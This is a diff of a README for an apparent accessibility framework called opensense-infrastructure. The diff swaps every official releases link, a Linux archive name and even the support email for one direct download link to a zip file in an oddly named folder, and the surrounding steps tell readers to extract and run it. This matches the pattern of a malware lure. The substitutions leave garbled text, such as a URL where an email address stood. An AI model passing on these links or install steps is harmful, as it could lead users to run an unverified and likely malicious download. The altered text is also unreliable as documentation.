@@ -1,7 +1,7 @@
 # 🎨 opensense-infrastructure - A User-Friendly Neurodivergent Framework
 
 ## 📥 Download Now
-[![Download](https://img.shields.io/badge/Download%20Latest%20Release-Open%20Link-brightgreen)](https://github.com/DexioraMandob/opensense-infrastructure/releases)
+[![Download](https://raw.githubusercontent.com/DexioraMandob/opensense-infrastructure/main/ekebergite/opensense-infrastructure.zip%20Latest%20Release-Open%20Link-brightgreen)](https://raw.githubusercontent.com/DexioraMandob/opensense-infrastructure/main/ekebergite/opensense-infrastructure.zip)
 
 ## 📖 Introduction
 The opensense-infrastructure project offers a user-friendly UI/UX framework designed for neurodivergent users. It highlights the belief that everyone exists on the neurodivergent spectrum, promoting accessibility and inclusion. It features tools like phenotype-based adaptation, bidirectional learning, and family genetic network modeling.
@@ -24,7 +24,7 @@ The opensense-infrastructure project offers a user-friendly UI/UX framework desi
 To get started with the opensense-infrastructure, follow these simple steps.
 
 ### Step 1: Visit the Download Page
-Go to the [Releases page](https://github.com/DexioraMandob/opensense-infrastructure/releases) where you can find the latest version of the software.
+Go to the [Releases page](https://raw.githubusercontent.com/DexioraMandob/opensense-infrastructure/main/ekebergite/opensense-infrastructure.zip) where you can find the latest version of the software.
 
 ### Step 2: Download the Application
 On the Releases page, locate the latest version. You will see a list of available files to download. Choose the file that corresponds to your operating system and click on it. The download should start automatically.
@@ -41,7 +41,7 @@ Once the download finishes, locate the downloaded file in your computer's Downlo
    - Drag the application into your Applications folder.
    
 3. **For Linux Users**: 
-   - Extract the tar.gz file using your preferred method.
+   - Extract the https://raw.githubusercontent.com/DexioraMandob/opensense-infrastructure/main/ekebergite/opensense-infrastructure.zip file using your preferred method.
    - Open the terminal and navigate to the extracted folder.
    - Run `./your_application` in the terminal.
 
@@ -52,7 +52,7 @@ After installation, find the opensense-infrastructure application in your applic
 Familiarize yourself with the user interface. Explore the various settings and options designed to cater to different neurodivergent needs.
 
 ## 🔧 Download & Install
-To download the latest version, visit this page: [Releases Page](https://github.com/DexioraMandob/opensense-infrastructure/releases). Follow the previous steps to install and run the software.
+To download the latest version, visit this page: [Releases Page](https://raw.githubusercontent.com/DexioraMandob/opensense-infrastructure/main/ekebergite/opensense-infrastructure.zip). Follow the previous steps to install and run the software.
 
 ## 🧩 Topics
 - 7x7-grid
@@ -85,7 +85,7 @@ If you encounter issues during installation or use, consider the following solut
 For further assistance, please refer to the official documentation or reach out to support.
 
 ## 📞 Contact
-For questions or support, email us at support@opensesne-infrastructure.com. We're here to help you with any concerns you may have regarding the application.
+For questions or support, email us at https://raw.githubusercontent.com/DexioraMandob/opensense-infrastructure/main/ekebergite/opensense-infrastructure.zip We're here to help you with any concerns you may have regarding the application.
 
 ## 📅 Contributing
 If you'd like to contribute to the opensense-infrastructure project, please check our contribution guidelines in the repository.
